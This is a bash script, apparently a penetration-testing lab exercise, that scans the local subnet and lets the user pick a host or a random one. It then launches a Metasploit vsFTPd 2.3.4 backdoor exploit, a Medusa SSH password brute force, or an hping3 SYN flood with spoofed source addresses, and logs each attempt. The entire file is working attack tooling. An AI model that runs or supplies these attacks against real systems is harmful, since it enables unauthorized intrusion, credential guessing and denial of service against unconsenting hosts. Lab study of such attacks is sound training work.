#!/bin/bash

#Creating a log file to store the events.
sudo touch /var/log/attacks.log
sudo chmod 777 /var/log/attacks.log


#Displaying the user's IP Address.
User_IP=$(ifconfig | grep inet | head -n 1 | awk '{print $2}')

echo "Your IP Address is $User_IP"


#Scanning network for IP Addresses and saving results into a text file.
sudo netdiscover -r "$User_IP"/24 -P -N | grep -Fv '.1 ' | grep -Fv '.2 ' | grep -Fv '.254 ' | grep -v 'Active' | awk '{print $1}' > Activehosts.txt

#Displaying IP Addresses found as options.
i=0
for addressnumber in $(cat Activehosts.txt)
do 

i=$(($i+1))
echo "$i) $addressnumber"

done

echo "Select IP address option to attack or enter 'random' to pick a random IP address: "
read integer


#Allowing user to choose a random IP Address from the options.
if [ $integer == 'random' ]
then 
numberIPs=$(cat Activehosts.txt | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | wc -l)

randomip=$(shuf -i 1-$numberIPs -n 1)

victim_ip=$(cat Activehosts.txt | head -n $randomip | tail -n 1)

else

victim_ip=$(cat Activehosts.txt | head -n $integer | tail -n 1) 
echo "$victim_ip"

fi


#Running an Nmap scan on the chosen IP Address.
echo "Scanning $victim_ip for open ports and services ..."

sudo nmap -sV -O $victim_ip

# The 'backdoor' function uses a metasploit exploit that exploits the known vsFTPd 2.3.4 backdoor command execution (CVE-2011-2523).
function backdoor()
{
	
	msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost $victim_ip;options;run"

}


# The 'bruteforce' function uses 'Medusa' to bruteforce the ssh service on the victim's server with specified users and password lists.
function bruteforce()
{
	
	echo -n "Input file path of username list: "
	read user_list
	echo -n "Input file path of password list: "
	read pass_list
	medusa -h $victim_ip -U $user_list -P $pass_list -n 22 -M ssh

}


#The 'dosattack' uses the hping3 command to flood the victim's server with Syn packets from random IP Addresses.
function dosattack()
{
	
	sudo hping3 -S -p 445 -d 120 -c 200 -w 64 --flood $victim_ip --rand-source 

}


#Prompting user to choose and attack.
echo "Attack options: "

echo " 1) vsFTPd 2.3.4 Backdoor Command Execution"
echo 'Uses metasploit to exploit ftp service. (Make sure client is running vsftpd 2.3.4)'
echo " 2) Bruteforce SSH Login Service"
echo 'Provide a username and password list to perform a bruteforce attempt on client SSH service. (Make sure client has ssh on port 22 open)'
echo " 3) Create a DOS Attack"
echo 'Flood client with Syn Packets from random source IPs. (Press alt+c to manually stop sending packets)'
echo " 4) Choose a Random attack"
echo 'Choose this option to perform any one of the above.'
echo -n "Choose an attack type: "


read options
randomattack=0

case $options in
1)

 
	backdoor
	
	
;;


2)

	bruteforce
	
;;

3) 


	dosattack
	
;;
	
4) 
randomattack=$(shuf -i 1-3 -n 1)
case $randomattack in 
1) 
echo "Running vsFTPd 2.3.4 Backdoor Command Execution"
sleep 2
backdoor
;;
2)
bruteforce
;;
3)
dosattack
;;
esac 

;;

*) 
echo 'Not a valid option, script will end. Bye bye.'

esac

#Logging the attempted date, time, attack and victim's IP address on the log file. 
attacktime=$(date)

if [ $options == 1 ] || [ $randomattack == 1 ]
then 
sudo echo "$attacktime vsFTPd 2.3.4 Backdoor Command Execution attempt on $victim_ip" >> /var/log/attacks.log

fi

if [ $options == 2 ] || [ $randomattack == 2 ] 

then 
sudo echo "$attacktime Bruteforce SSH Login Service attempt on $victim_ip" >> /var/log/attacks.log

fi

if [ $options == 3 ] || [ $randomattack == 3 ] 

then 
sudo echo "$attacktime DOS Attack attempt on $victim_ip" >> /var/log/attacks.log

fi

echo 'Attack attempt has been logged succesfully in /var/log/attacks.log'




	
